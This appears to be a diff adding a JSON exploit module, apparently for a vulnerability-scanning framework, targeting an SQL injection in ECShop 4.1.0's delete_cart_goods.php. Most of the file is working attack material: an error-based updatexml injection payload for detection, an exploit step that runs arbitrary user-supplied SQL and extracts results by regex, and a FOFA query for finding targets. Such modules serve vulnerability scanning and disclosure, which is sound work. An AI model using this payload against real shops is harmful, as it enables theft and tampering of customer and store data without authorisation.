@@ -1,0 +1,108 @@
+{
+  "Name": "ECShop delete_cart_goods.php SQLi",
+  "Description": "ECSHOP is a professional e-commerce mall system. SQL injection vulnerability exists in ECSHOP 4.1.0, which can be used by attackers to obtain sensitive information.",
+  "Product": "ECShop",
+  "Homepage": "http://www.ecshop.com/",
+  "DisclosureDate": "2021-04-06",
+  "Author": "sharecast.net@gmail.com",
+  "FofaQuery": "app=\"ECShop\"",
+  "Level": "2",
+  "Impact": "Attacker can directly execute SQL statements, so as to control the entire server: access to data, modify data, delete data, etc.",
+  "Recommendation": "Update patch",
+  "References": [
+    "https://mp.weixin.qq.com/s/1t0uglZNoZERMQpXVVjIPw"
+  ],
+  "HasExp": true,
+  "ExpParams": [{
+      "name": "cmd",
+      "type": "input",
+      "value": "select database()",
+      "show": ""
+  }],
+  "ExpTips": {
+    "Type": "",
+    "Content": ""
+  },
+    "ScanSteps": [
+        "AND",
+        {
+            "Request": {
+                "method": "POST",
+                "uri": "/delete_cart_goods.php",
+                "follow_redirect": false,
+                "header": {
+                    "Content-Type": "application/x-www-form-urlencoded"
+                },
+                "data_type": "text",
+                "data": "id=0||(updatexml(1,concat(0x7e,(select%20md5(123)),0x7e),1))"
+            },
+            "ResponseTest": {
+                "type": "group",
+                "operation": "AND",
+                "checks": [{
+                        "type": "item",
+                        "variable": "$code",
+                        "operation": "==",
+                        "value": "200",
+                        "bz": ""
+                    },
+                    {
+                        "type": "item",
+                        "variable": "$body",
+                        "operation": "contains",
+                        "value": "202cb962ac59075b964b07152d234b7",
+                        "bz": ""
+                    }
+                ]
+            },
+            "SetVariable": []
+        }
+    ],
+    "ExploitSteps": [
+        "AND",
+        {
+            "Request": {
+                "method": "POST",
+                "uri": "/delete_cart_goods.php",
+                "follow_redirect": false,
+                "header": {
+                    "Content-Type": "application/x-www-form-urlencoded"
+                },
+                "data_type": "text",
+                "data": "id=0||(updatexml(1,concat(0x7e,({{{cmd}}}),0x7e),1))"
+            },
+            "ResponseTest": {
+                "type": "group",
+                "operation": "AND",
+                "checks": [{
+                        "type": "item",
+                        "variable": "$code",
+                        "operation": "==",
+                        "value": "200",
+                        "bz": ""
+                    },
+                    {
+                        "type": "item",
+                        "variable": "$body",
+                        "operation": "contains",
+                        "value": "DELETE FROM",
+                        "bz": ""
+                    }
+                ]
+            },
+            "SetVariable": [
+                "output|lastbody|regex|XPATH syntax error:.*?'~([^~]+)~'"
+            ]
+        }
+    ],
+  "Tags": ["sqli"],
+  "CVEIDs": null,
+  "CVSSScore": null,
+  "AttackSurfaces": {
+    "Application": ["ECShop"],
+    "Support": null,
+    "Service": null,
+    "System": null,
+    "Hardware": null
+  }
+}
